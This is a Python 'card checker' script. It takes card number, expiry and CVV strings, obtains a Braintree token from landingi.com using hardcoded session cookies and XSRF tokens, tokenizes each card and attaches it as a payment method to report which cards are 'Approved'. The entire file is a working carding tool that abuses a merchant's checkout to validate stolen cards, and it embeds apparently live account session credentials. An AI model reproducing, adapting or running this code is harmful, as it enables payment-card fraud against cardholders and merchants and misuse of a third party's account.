import requests
import re
import base64

def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def chk(card):
    import requests, re, base64, random, string, user_agent, time
    from requests_toolbelt.multipart.encoder import MultipartEncoder
    from requests.packages.urllib3.exceptions import InsecureRequestWarning

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    card = card.strip()
    parts = re.split('[|/:]', card)
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]

    if "20" in yy:
        yy = yy.split("20")[1]

    r = requests.session()

    cookies = {
    'gtmReferrer': '',
    '_l_hs_fs_click': 'https://landingi.com/',
    '_l_hs_referrer': '',
    '_l_hs_ls_click': 'https://landingi.com/',
    '_fbp': 'fb.1.1743118481202.7008210605986862',
    'referer': 'https://app.landingi.com/',
    '_ga': 'GA1.1.1017550300.1743403585',
    'PHPSESSID_APPLICATION': '3mol7r85r9sv9u2c18c534jussm5111b',
    '_gcl_au': '1.1.603618818.1743118480.701780047.1743403615.1743403632',
    'landingi_uid': '360354',
    'landingi_token': 'a6030a957e463caaa0a006bb977e4adb',
    'PHPLANDINGIAPPSESSID': 'sknklvo4h0jndga7inb19nl965',
    '_ga_XBSMP5075L': 'GS1.1.1743403585.1.1.1743403685.35.0.0',
    '_uetsid': 'de2aa7700dfb11f0bb4751b669abd6df',
    '_uetvid': '0df74de00b6411f0ab7435e1aeb2f4df',
}

    headers = {
    'authority': 'app.landingi.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'baggage': 'sentry-environment=production,sentry-release=7dd71c8724b6e16c0ce0d0f192b4da644bc720a6,sentry-public_key=554db9e614674fbf988cc5b4d2854cd1,sentry-trace_id=28b014ef64c549d1b566325ace99353b,sentry-sample_rate=0.25,sentry-transaction=%2F%2Fcredit-card-step,sentry-sampled=false',
    'origin': 'https://app.landingi.com',
    'referer': 'https://app.landingi.com/credit-card-step?lang=en&period=1',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sentry-trace': '28b014ef64c549d1b566325ace99353b-955309ad0f5ee1ca-0',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-xsrf-token': 'f1f924e5ad.aW_ivto0skTI2yzSxMBLNFC9ppY85z7_A8VGI7e6Yzk.Mwap4e1i6huRhGrqsrUveTvVzvB-sFmxZoooWoLVCFIuH4_KjQfHD67uTw',
}

    json_data = {}

    response = requests.post(
    'https://app.landingi.com/api/payments/create-braintree-token',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
 
    enc = response.json()['token']
 
    dec = base64.b64decode(enc).decode('utf-8')
 
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
 


    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://app.landingi.com',
    'referer': 'https://app.landingi.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '0287cc9e-7eb8-43b9-a1b4-33e8c492decb',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': True,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

 
    tok = response.json()['data']['tokenizeCreditCard']['token']
 



    cookies = {
    'gtmReferrer': '',
    '_l_hs_fs_click': 'https://landingi.com/',
    '_l_hs_referrer': '',
    '_l_hs_ls_click': 'https://landingi.com/',
    '_fbp': 'fb.1.1743118481202.7008210605986862',
    'referer': 'https://app.landingi.com/',
    '_ga': 'GA1.1.1017550300.1743403585',
    'PHPSESSID_APPLICATION': '3mol7r85r9sv9u2c18c534jussm5111b',
    '_gcl_au': '1.1.603618818.1743118480.701780047.1743403615.1743403632',
    'landingi_uid': '360354',
    'landingi_token': 'a6030a957e463caaa0a006bb977e4adb',
    'PHPLANDINGIAPPSESSID': 'sknklvo4h0jndga7inb19nl965',
    '_ga_XBSMP5075L': 'GS1.1.1743403585.1.1.1743403685.35.0.0',
    '_uetsid': 'de2aa7700dfb11f0bb4751b669abd6df',
    '_uetvid': '0df74de00b6411f0ab7435e1aeb2f4df',
}
    headers = {
    'authority': 'app.landingi.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'baggage': 'sentry-environment=production,sentry-release=7dd71c8724b6e16c0ce0d0f192b4da644bc720a6,sentry-public_key=554db9e614674fbf988cc5b4d2854cd1,sentry-trace_id=28b014ef64c549d1b566325ace99353b,sentry-sample_rate=0.25,sentry-transaction=%2F%2Fcredit-card-step,sentry-sampled=false',
    'content-type': 'application/json',
    'origin': 'https://app.landingi.com',
    'referer': 'https://app.landingi.com/credit-card-step?lang=en&period=1',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sentry-trace': '28b014ef64c549d1b566325ace99353b-955309ad0f5ee1ca-0',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-xsrf-token': 'a17350d5050f9e3a17896.FPE9D7d_lCWI42vjlIaVyH97z6sSfRVQIsWvJJ5nxFw.Tph2UIApzHrRvC3b4vPxhRQTp81QKnIeR4rBXasIrzdTgVB74Ezhbu7WCA',
}

    json_data = {
    'nonce':tok,
}

    response = requests.post('https://app.landingi.com/api/payments/payment-methods', cookies=cookies, headers=headers, json=json_data)
    text = response.text
    pattern = r'"message":"(.*?)"'

    match = re.search(pattern, text)
    if match:
        result = match.group(1)
        if 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
    else:
        if '"token":"' in text:  # التحقق مما إذا كان هناك توكن بدلاً من رسالة خطأ
            result = "1000: Approved"
        elif 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
            result = "1000: Approved"
        else:
            result = "Error"

    return result
